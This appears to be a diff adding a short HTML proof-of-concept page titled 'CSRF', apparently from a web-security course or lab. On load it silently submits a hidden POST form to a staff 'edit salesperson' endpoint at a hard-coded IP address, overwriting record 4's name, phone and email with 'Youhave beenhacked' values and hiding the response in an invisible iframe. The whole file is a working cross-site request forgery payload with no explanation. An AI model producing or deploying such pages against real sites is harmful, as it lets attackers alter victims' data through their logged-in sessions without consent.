@@ -1,0 +1,15 @@
+<html>
+  <head>
+    <title>CSRF</title>
+  </head>
+  <body onload="document.edit_salesperson.submit()">
+      <h1> My session</h1>  
+    <form action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=4" method="POST" name="edit_salesperson" style="display: none;" target="hidden_results" >
+      <input type="text" name="first_name" value="Youhave"><br>
+      <input type="text" name="last_name" value="beenhacked"><br>
+      <input type="text" name="phone" value="12345678"><br>
+      <input type="text" name="email" value="hacked@hacked.com"><br>
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+  </body>
+</html>
